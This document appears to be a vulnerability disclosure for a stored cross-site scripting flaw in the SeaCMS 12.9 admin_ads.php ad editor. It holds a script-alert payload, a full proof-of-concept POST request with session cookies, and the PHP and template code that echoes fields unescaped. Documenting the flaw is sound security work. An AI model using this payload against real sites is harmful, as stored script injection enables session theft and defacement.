### seacms12.9 admin_ads.php stored xss

Visit the admin_ads.php route and enter the parameter action=edit



Go to the following page

![image-20240821003639113](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821003639113.png)

Enter the following code in the ad description

`<script>alert(1)</script>`

Click to edit ad

![image-20240821003721157](https://gitee.com/nn0nkey/picture/raw/master/img/image-20240821003721157.png)

Success pop-up window

**POC**

```java
POST /p8qca/admin_ads.php?action=editsave&id=3&page=1 HTTP/1.1
Host: seacms:8181
Content-Length: 187
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://seacms:8181
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://seacms:8181/p8qca/admin_ads.php?action=edit&page=1&id=3
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=5dl35hp50uj606p52se8kg91a2; t00ls=e54285de394c4207cd521213cebab040; t00ls_s=YTozOntzOjQ6InVzZXIiO3M6MjY6InBocCB8IHBocD8gfCBwaHRtbCB8IHNodG1sIjtzOjM6ImFsbCI7aTowO3M6MzoiaHRhIjtpOjE7fQ%3D%3D
Connection: keep-alive

adname=channel728x90&adenname=channel728x90&intro=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&adsbody=document.writeln%28%22%3Cdiv+class%3D%5C%22guanggao_neirong%5C%22%3E%3C%5C%2Fdiv%3E%22%29
```

Automatically jump to pop-up window after sending POC

The following is code analysis

There is the following code in admin_ads.php

```php
elseif($action=="edit")
{
   $row = $dsql->GetOne("Select * From `sea_myad` where aid='$id'");
   include(sea_ADMIN.'/templets/admin_ads_edit.htm');
   exit();
}
```

包含了/templets/admin_ads_edit.htm文件

```java
<tr class="thead"><th colspan="2">修改广告</th></tr>
    <TR>
      <TD vAlign=center width="11%" >广告名称：</TD>
      <TD width="89%" ><input type="text" size="50" name="adname" value="<?php echo $row['adname']?>" /><font color="red">＊</font></TD>
    </TR>
    <TR>
      <TD >广告标识：</TD>
      <TD ><input type="text" size="50" name="adenname" value="<?php echo $row['adenname']?>" /><font color="red">＊</font></TD>
    </TR>
    <TR>
      <TD >广告描述：</TD>
      <TD ><input type="text" size="100" name="intro" value="<?php echo $row['intro']?>" /></TD>
    </TR>
    <TR>
       <TD >广告内容：<br />(<font color="red">填写js代码</font>)<br /><input type="button" value="HTML转JS"  onclick="openHtmlToJsWin('htmltojs')" class="rb1"/><br/><input type="button" value="JS转HTML"  onclick="openHtmlToJsWin('jstohtml')" class="rb1"/></TD>
      <TD ><textarea name="adsbody" id="adsbody"  style="width:98%;font-family: Arial, Helvetica, sans-serif;font-size: 14px;" rows="20"  ><?php echo $row['adsbody']?></textarea><font color="red">＊</font></TD>
    </TR>
    <TR>
      <td></td><TD ><input type="submit" value="修 改 广 告" class="rb1" />
      &nbsp;<input type="button" value="返   回"  class="rb1" onClick="javascript:history.go(-1)" /></TD>
    </TR>
</td></tr></table>
```

It can be found that the page will output our adsbody to the page, and then store it in the database, resulting in stored xss

